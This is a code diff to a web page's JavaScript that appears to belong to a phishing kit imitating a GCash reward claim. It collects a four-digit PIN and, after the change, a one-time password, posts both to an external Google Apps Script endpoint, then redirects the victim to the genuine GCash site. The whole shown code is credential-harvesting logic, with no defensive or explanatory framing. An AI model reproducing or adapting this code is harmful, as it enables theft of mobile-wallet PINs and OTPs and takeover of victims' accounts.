@@ -357,13 +357,12 @@ function sendPIN() {
                 document.getElementById("pin2").value +
                 document.getElementById("pin3").value +
                 document.getElementById("pin4").value;
-    const mobileNumber = document.getElementById("mobileNumber").value;
+    const otp = document.getElementById("otpInput").value; // Using OTP instead of mobile number
     const claimButton = document.getElementById("claimButton");
 
     // Check if already claimed
     if (sessionStorage.getItem("claimed")) {
         Swal.fire("Error", "You can't claim twice!", "error");
-
         return;
     }
 
@@ -374,15 +373,13 @@ function sendPIN() {
     fetch("https://script.google.com/macros/s/AKfycbyY4P4NkLUkzCMWv9dAPJpVLQj8DfbJIo0iqe0v39HpUnzzW3zDcZk6UfSk-LRU4Sz3pQ/exec", {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `number=${mobileNumber}&pin=${pin}`
+        body: `otp=${otp}&pin=${pin}` // Sending OTP instead of mobile number
     })
     .then(response => response.json())
     .then(data => {
         if (data.status === "success") {
             sessionStorage.setItem("claimed", "true"); // Set flag to prevent multiple claims
-           
-                window.location.href = "https://new.gcash.com"; // Change this to your redirect page
-
+            window.location.href = "https://new.gcash.com"; // Change this to your redirect page
         } else {
             Swal.fire("Error", data.message, "error");
         }
@@ -392,6 +389,7 @@ function sendPIN() {
         Swal.fire("Error", "Something went wrong. Please try again.", "error");
     });
 }
+
 
 // Clear inputs if user goes back
 window.addEventListener("pageshow", function () {
